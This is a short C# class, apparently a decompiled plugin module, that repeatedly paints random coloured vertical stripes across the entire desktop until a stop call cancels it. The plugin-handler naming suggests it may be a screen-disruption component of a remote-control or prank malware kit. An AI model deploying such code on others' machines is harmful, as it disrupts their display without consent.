using System;
using System.Threading;
using System.Windows.Forms;
using Plugin.Helper.GDI;

namespace Plugin.Handler.GDI;

internal class HandleStripes
{
	public static CancellationTokenSource ctsStop;

	public static void Start()
	{
		if (ctsStop != null && !ctsStop.IsCancellationRequested)
		{
			return;
		}
		ctsStop = new CancellationTokenSource();
		int width = Screen.PrimaryScreen.Bounds.Width;
		int height = Screen.PrimaryScreen.Bounds.Height;
		Random random = new Random();
		while (!ctsStop.IsCancellationRequested)
		{
			IntPtr dC = NativeMethods.GetDC(IntPtr.Zero);
			int x = random.Next(width);
			int color = NativeMethods.RGB(random.Next(256), random.Next(256), random.Next(256));
			for (int i = 0; i < 15; i++)
			{
				for (int j = 0; j < height; j++)
				{
					NativeMethods.SetPixel(dC, x, j, color);
				}
			}
			NativeMethods.ReleaseDC(IntPtr.Zero, dC);
		}
	}

	public static void Stop()
	{
		if (ctsStop != null && !ctsStop.IsCancellationRequested)
		{
			ctsStop.Cancel();
		}
	}
}
